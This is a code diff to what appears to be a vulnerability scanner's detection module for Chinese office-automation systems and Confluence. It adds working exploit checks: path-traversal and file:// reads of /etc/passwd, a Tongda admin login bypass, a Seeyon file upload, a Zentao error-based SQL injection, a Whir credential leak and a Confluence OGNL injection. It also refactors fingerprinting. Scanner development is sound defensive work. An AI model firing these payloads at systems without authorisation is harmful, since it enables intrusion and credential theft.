@@ -38,6 +38,8 @@ OA_RULES: Dict[str, dict] = {
                 "params": {"isFromOutDoc": "true", "downloadFileId": "../../../../etc/passwd"},
                 "type": "lfi",
                 "severity": "high",
+                # 任意文件读取：响应含 /etc/passwd 内容特征
+                "evidence": "root:",
             },
             {"path": "/api/portal/weaver/weaver.do", "method": "POST", "type": "rce", "severity": "critical"},
             {
@@ -53,10 +55,14 @@ OA_RULES: Dict[str, dict] = {
         "keywords": ["tongda", "通达", "td_", "/general/"],
         "checks": [
             {
-                "path": "/ispirit/remotelogin.php",
-                "params": {"type": "mobile"},
+                # 前台任意用户登录（uid 可控，uid=1 即 admin；codeuid 任意值即可）
+                # 影响：< 11.5.200417、2017 版。响应含 "status":1 即登录态写入成功
+                "path": "/ispirit/login_code_scan.php",
+                "method": "POST",
+                "params": {"codeuid": "rayscan", "uid": "1", "source": "pc", "type": "confirm", "username": "admin"},
                 "type": "auth_bypass",
                 "severity": "critical",
+                "evidence": '"status":1',
             },
             {
                 "path": "/mac/gateway.php",
@@ -76,12 +82,29 @@ OA_RULES: Dict[str, dict] = {
                 "type": "rce",
                 "severity": "critical",
             },
+            {
+                # CommonFileServer 任意文件读取（6.x/7.x/8.x 均受影响）
+                # 读取 Windows 基准文件 win.ini，响应含 [fonts] 节即命中
+                "path": "/CommonFileServer/c:/windows/win.ini",
+                "type": "file_read",
+                "severity": "high",
+                "evidence": "[fonts]",
+            },
         ],
     },
     "蓝凌-Landray": {
         "paths": ["/landray/", "/sys/", "/km/"],
         "keywords": ["landray", "蓝凌", "ekp"],
         "checks": [
+            {
+                # CNVD-2021-28277 前台任意文件读取：var 指定 file:// 读取 /etc/passwd
+                "path": "/sys/ui/extend/varkind/custom.jsp",
+                "method": "POST",
+                "params": {"var": '{"body":{"file":"file:///etc/passwd"}}'},
+                "type": "file_read",
+                "severity": "high",
+                "evidence": "root:",
+            },
             {
                 "path": "/sys/ui/extend/varkind/custom_pf.jsp",
                 "params": {"var": "1"},
@@ -96,6 +119,16 @@ OA_RULES: Dict[str, dict] = {
         "checks": [
             {"path": "/seeyon/htmlofficeservlet", "type": "rce", "severity": "critical"},
             {"path": "/seeyon/thirdpartyController.do", "type": "rce", "severity": "critical"},
+            {
+                # CNVD-2021-01627 ajax.do 任意文件上传：上传成功返回 500 + code 08441 开头
+                "path": "/seeyon/ajax.do",
+                "method": "POST",
+                "params": {"method": "uploadPageLayoutAttachment", "managerName": "portalDesignerManager"},
+                "type": "file_upload",
+                "severity": "high",
+                "evidence": '"code":"08441',
+                "status_codes": [500],
+            },
         ],
     },
     "用友-Yonyou": {
@@ -103,6 +136,17 @@ OA_RULES: Dict[str, dict] = {
         "keywords": ["yonyou", "用友", "ufida", "nccloud"],
         "checks": [
             {"path": "/servlet/~uapss/uploadServlet", "type": "rce", "severity": "critical"},
+            {
+                # portal/file 任意文件读取：路径遍历读 WEB-INF/web.xml，响应含 <web-app
+                "path": "/portal/file",
+                "params": {
+                    "cmd": "getFileLocal",
+                    "fileid": "..%2F..%2F..%2F..%2Fwebapps%2Fnc_web%2FWEB-INF%2Fweb.xml",
+                },
+                "type": "file_read",
+                "severity": "high",
+                "evidence": "<web-app",
+            },
         ],
     },
     "禅道-Zentao": {
@@ -115,13 +159,32 @@ OA_RULES: Dict[str, dict] = {
                 "type": "sqli",
                 "severity": "critical",
             },
+            {
+                # CNVD-2022-42853 前台 SQL 注入（16.5 等）：updatexml 报错注入，
+                # 注入点 = router setVision() 的 owner='$account' 拼接（非登录查询），
+                # 参数走 query string 可绕过 filterCSRF（只清 $_POST 不清 $_GET）。
+                # 注意 (user) 会被解析为列名报 Unknown column，必须用 user() 函数。
+                "path": "/zentao/user-login.html",
+                "method": "POST",
+                "params": {"account": "admin' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1'='1"},
+                "type": "sqli",
+                "severity": "high",
+                "evidence": "xpath syntax error",
+            },
         ],
     },
     "万户-Whir": {
         "paths": ["/whir/", "/defaultroot/"],
         "keywords": ["whir", "万户"],
         "checks": [
-            {"path": "/defaultroot/uploadFile.jsp", "type": "file_upload", "severity": "high"},
+            {
+                # evoInterfaceServlet 未授权访问：返回登录账号 + MD5 密码（userList）
+                "path": "/defaultroot/evoInterfaceServlet",
+                "params": {"paramType": "user"},
+                "type": "unauth",
+                "severity": "critical",
+                "evidence": '"userList"',
+            },
         ],
     },
     "Nacos": {
@@ -165,6 +228,17 @@ OA_RULES: Dict[str, dict] = {
         "keywords": ["confluence", "atlassian"],
         "checks": [
             {"path": "/confluence/", "type": "info", "severity": "info"},
+            # CVE-2021-26084: Webwork pre-auth OGNL 注入 RCE（queryString 参数）
+            # payload 计算 233*233=54289，响应正文含结果即命中
+            {
+                "path": "/pages/doenterpagevariables.action",
+                "type": "rce",
+                "severity": "critical",
+                "method": "POST",
+                "param_type": "body",
+                "params": {"queryString": "%5cu0027%2b%7b233*233%7d%2b%5cu0027"},
+                "evidence": "54289",
+            },
         ],
     },
 }
@@ -296,16 +370,37 @@ class OADetector(DetectionModule):
         html = ""
         headers: Dict[str, str] = {}
         if not detected_oa:
-            try:
-                resp = await self._send_request("GET", url, {})
-                if resp:
-                    html = resp.get("text", "") or ""
-                    headers = resp.get("headers", {}) or {}
-                    detected_oa = self._detect_oa_type(url, html, headers)
-            except Exception:
-                detected_oa = None
+            html, headers = await self._fetch_homepage_for_fingerprint(url)
+            detected_oa = self._detect_oa_type(url, html, headers)
         if not detected_oa:
             detected_oa = self._detect_oa_type(url, html, headers)  # URL 兜底
+
+        # S5 增强：根路径无指纹时，探测各 OA 候选子路径（如 Nacos 的 /nacos/、
+        # 泛微 /weaver/），用内容指纹识别。解决 OA 部署在 context path 下识别不到的问题。
+        if not detected_oa:
+            for oa_name, rule in OA_RULES.items():
+                for path in rule["paths"]:
+                    probe_url = url + path
+                    try:
+                        resp = await self._send_request("GET", probe_url, {})
+                        if resp and resp.get("status_code") == 200:
+                            probe_html = resp.get("text", "") or ""
+                            probe_headers = resp.get("headers", {}) or {}
+                            if self._match_content_fingerprint(oa_name, probe_html, probe_headers):
+                                detected_oa = oa_name
+                                html = probe_html
+                                headers = probe_headers
+                                self._detected_oa = oa_name  # 回写实例属性，保持 scanner 状态一致
+                                self.logger.info(f"[OA] 子路径探测识别: {oa_name} ({probe_url})")
+                                break
+                    except Exception:
+                        continue
+                if detected_oa:
+                    break
+
+        # 回写实例属性，保持 scanner 状态一致（scanner 注入与内部检测统一出口）
+        if detected_oa:
+            self._detected_oa = detected_oa
 
         if not detected_oa:
             self.logger.info("[OA] 未识别到已知 OA 系统，执行通用 OA 检测")
@@ -316,6 +411,31 @@ class OADetector(DetectionModule):
 
         # Step 1.5: 版本识别（S3 三级链路第 2 级，供检查项版本过滤）
         self._detected_version = self._detect_oa_version(detected_oa, html, headers)
+        if not self._detected_version and detected_oa == "Nacos":
+            # Nacos 1.4.x 首页无版本变量，从 server/state 接口提取（如 {"version":"1.4.0"}）
+            for state_path in ("/nacos/v1/console/server/state", "/v1/console/server/state"):
+                try:
+                    state_resp = await self._send_request("GET", url + state_path, {})
+                    if state_resp and state_resp.get("status_code") == 200:
+                        import json as _json
+
+                        state = _json.loads(state_resp.get("text", "") or "{}")
+                        v = state.get("version")
+                        if v:
+                            self._detected_version = str(v)
+                            break
+                except Exception:
+                    continue
+        if not self._detected_version and detected_oa == "禅道-Zentao":
+            # 禅道首页（欢迎页）无版本标记，登录页资源 URL 带 ?v=16.5
+            try:
+                login_resp = await self._send_request("GET", url + "/zentao/user-login.html", {})
+                if login_resp and login_resp.get("status_code") == 200:
+                    m = re.search(r"[?&]v=([0-9]+\.[0-9]+(?:\.[0-9]+)?)", login_resp.get("text", "") or "")
+                    if m:
+                        self._detected_version = m.group(1)
+            except Exception:
+                pass
         if self._detected_version:
             self.logger.info(f"[OA] 版本识别: {detected_oa} {self._detected_version}")
 
@@ -337,6 +457,27 @@ class OADetector(DetectionModule):
         vulnerabilities.extend(common_vulns)
 
         return vulnerabilities
+
+    async def _fetch_homepage_for_fingerprint(self, url: str):
+        """
+        S5 修复：抓首页用于指纹识别，容忍 4xx/5xx 状态码。
+
+        session 对 4xx 抛 RequestError（S1 误报治理：不把错误页当内容），但 OA 指纹
+        恰恰依赖错误页正文——Spring Boot 的 Whitelabel Error Page 就是 404。此处用
+        独立 httpx 请求拿正文+头，不经过 session 的错误抛出路径。
+        """
+        try:
+            import httpx
+
+            verify_ssl = self.config.get("verify_ssl", True)
+            async with httpx.AsyncClient(
+                timeout=self.module_config.timeout, verify=verify_ssl, trust_env=False
+            ) as client:
+                resp = await client.get(url, follow_redirects=True)
+                return resp.text or "", dict(resp.headers)
+        except Exception as e:
+            self.logger.debug(f"[OA] 首页指纹抓取失败 {url}: {e}")
+            return "", {}
 
     @staticmethod
     def _match_content_fingerprint(oa_name: str, html: str, headers: Optional[Dict[str, str]]) -> bool:
@@ -437,6 +578,21 @@ class OADetector(DetectionModule):
             m = re.search(rf"{name}[\"']?\s*[:=]\s*[\"']?v?([0-9]+\.[0-9]+(?:\.[0-9]+)?)", html, re.I)
             if m:
                 return m.group(1)
+            # 禅道兜底：资源 URL 版本标记（如 /zentao/js/all.js?v=16.5）
+            if oa_name == "禅道-Zentao":
+                m = re.search(r"[?&]v=([0-9]+\.[0-9]+(?:\.[0-9]+)?)", html)
+                if m:
+                    return m.group(1)
+
+        if oa_name == "Confluence":
+            # 安装向导/页面 meta: <meta name="ajs-version-number" content="7.4.10">
+            m = re.search(r'ajs-version-number"\s+content="([0-9]+\.[0-9]+\.[0-9]+)', html, re.I)
+            if m:
+                return m.group(1)
+            # 兜底: license 申请链接 version=7.4.10&build=8402
+            m = re.search(r"version=([0-9]+\.[0-9]+\.[0-9]+)", html, re.I)
+            if m:
+                return m.group(1)
 
         return None
 
@@ -477,6 +633,9 @@ class OADetector(DetectionModule):
         vuln_type_str = check.get("type", "info")
         severity_str = check.get("severity", "info")
         params = check.get("params", {})
+        param_type = check.get("param_type", "query")
+        # 允许的响应状态码（默认 200；个别漏洞如致远 ajax.do 上传成功返回 500）
+        allowed_status = check.get("status_codes", [200])
 
         vuln_type = VULN_TYPE_MAP.get(vuln_type_str, VulnerabilityType.OTHER)
         severity = SEVERITY_MAP.get(severity_str, Severity.INFO)
@@ -489,12 +648,18 @@ class OADetector(DetectionModule):
             return None
 
         try:
-            resp = await self._send_request(method, check_url, params)
+            # S5 续：检查项显式声明非 2xx 成功状态码时（如致远 ajax.do 上传成功返回 500），
+            # session 会把 5xx 当错误重试并抛 RequestError、正文丢失，改用独立 httpx
+            # 请求容忍该状态码直接拿正文做证据验证。
+            if any(not (200 <= s < 300) for s in allowed_status):
+                resp = await self._fetch_with_status(method, check_url, params, param_type)
+            else:
+                resp = await self._send_request(method, check_url, params, param_type=param_type)
 
-            # S1 误报治理：仅 HTTP 200 + 响应证据验证通过才算漏洞。
+            # S1 误报治理：仅允许状态码 + 响应证据验证通过才算漏洞。
             # 移除历史"状态码即漏洞"判定（401/403 被正确拦截 ≠ 未授权访问；
-            # 500/302 是错误页/重定向，非漏洞证据）。
-            if resp and resp.get("status_code") == 200:
+            # 500/302 是错误页/重定向，非漏洞证据；个别漏洞以 500 回显成功特征除外）。
+            if resp and resp.get("status_code") in allowed_status:
                 status = resp["status_code"]
                 body = resp.get("text", "")
                 content_type = resp.get("headers", {}).get("content-type", "")
@@ -506,10 +671,10 @@ class OADetector(DetectionModule):
                     return self._create_vuln(
                         url=check_url,
                         param=list(params.keys())[0] if params else None,
-                        param_type="query",
+                        param_type=param_type,
                         method=method,
                         payload=check_url,
-                        vuln_type=vuln_type,
+                        explicit_vuln_type=vuln_type,
                         severity=severity,
                         confidence=Confidence.MEDIUM,
                         evidence=f"HTTP {status}",
@@ -521,6 +686,36 @@ class OADetector(DetectionModule):
             self.logger.debug(f"[OA] 检测失败 {check_url}: {e}")
 
         return None
+
+    async def _fetch_with_status(self, method: str, url: str, params: dict, param_type: str):
+        """S5 续：独立 httpx 请求，容忍非 2xx 状态码并保留响应正文。
+
+        session 对 5xx 会重试并抛 RequestError（正文丢失），而个别 OA 漏洞以
+        5xx 回显成功特征（如致远 ajax.do 上传成功返回 500 + code 08441）。
+        """
+        try:
+            import httpx
+
+            verify_ssl = self.config.get("verify_ssl", True)
+            kwargs = {"timeout": self.module_config.timeout, "verify": verify_ssl, "trust_env": False}
+            if method.upper() == "GET":
+                if params:
+                    kwargs["params"] = params
+            else:
+                if param_type == "body":
+                    kwargs["data"] = params
+                elif params:
+                    kwargs["params"] = params
+            async with httpx.AsyncClient(**kwargs) as client:
+                resp = await client.request(method.upper(), url)
+                return {
+                    "status_code": resp.status_code,
+                    "text": resp.text,
+                    "headers": dict(resp.headers),
+                }
+        except Exception as e:
+            self.logger.debug(f"[OA] 状态码容忍请求失败 {url}: {e}")
+            return None
 
     @staticmethod
     def _is_html(body: str) -> bool:
@@ -560,7 +755,7 @@ class OADetector(DetectionModule):
             return False
 
         if vuln_type_str == "sqli":
-            # 注入成功证据：SQL 报错特征，或（禅道 API）JSON 结果中带 success
+            # 注入成功证据：SQL 报错特征，或（禅道 API）JSON 结果 success 为 true
             sql_error_signs = (
                 "syntax error",
                 "sqlstate",
@@ -573,7 +768,8 @@ class OADetector(DetectionModule):
             )
             if any(s in body_lower for s in sql_error_signs):
                 return True
-            return body.strip().startswith("{") and '"success"' in body_lower
+            # success 必须为 true 才算命中（"success":false 不是注入成功证据）
+            return body.strip().startswith("{") and re.search(r'"success"\s*:\s*true', body_lower) is not None
 
         if vuln_type_str == "rce":
             # 序列化/二进制载荷回显（致远 htmlofficeservlet GWT、金蝶 BOS）：octet-stream
@@ -628,7 +824,7 @@ class OADetector(DetectionModule):
                             param_type="query",
                             method="GET",
                             payload="",
-                            vuln_type="info_disclosure",
+                            explicit_vuln_type=VulnerabilityType.INFO_DISCLOSURE,
                             severity=Severity.LOW,
                             confidence=Confidence.LOW,
                             evidence=pattern or "KEY=value pairs",
